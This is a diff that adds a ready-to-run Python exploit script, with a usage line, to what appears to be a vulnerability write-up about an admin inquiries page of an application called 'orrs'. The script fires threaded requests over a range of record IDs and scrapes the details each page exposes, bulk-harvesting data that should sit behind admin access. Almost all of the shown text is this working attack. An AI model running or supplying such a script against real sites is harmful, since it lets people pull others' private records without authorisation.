@@ -26,3 +26,49 @@ Exploitation:
 
 OR USE this Python Script:
 
+Python
+
+```
+import requests
+import threading
+from bs4 import BeautifulSoup
+
+def send_request_and_extract_data(id):
+    url = input("Enter Url eg: http://localhost: ")
+    path = f"{url}/orrs/admin/inquiries/view_details.php?id={id}"
+    response = requests.get(path)
+    soup = BeautifulSoup(response.text, 'html.parser')
+
+    data = []
+    for dl in soup.find_all('dl'):
+        for dt, dd in zip(dl.find_all('dt', class_='text-primary'), dl.find_all('dd', class_='pl-4')):
+            data.append((dt.text, dd.text))
+
+    print(f"ID: {id}")
+    for item in data:
+        print(f"{item[0]}: {item[1]}")
+    print()
+
+def main():
+    from_id = int(input("Enter the starting ID: "))
+    to_id = int(input("Enter the ending ID: "))
+
+    threads = []
+    for id in range(from_id, to_id + 1):
+        t = threading.Thread(target=send_request_and_extract_data, args=(id,))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+
+if __name__ == "__main__":
+    main()
+
+```
+Usage
+
+```
+python3 exp.py
+
+```
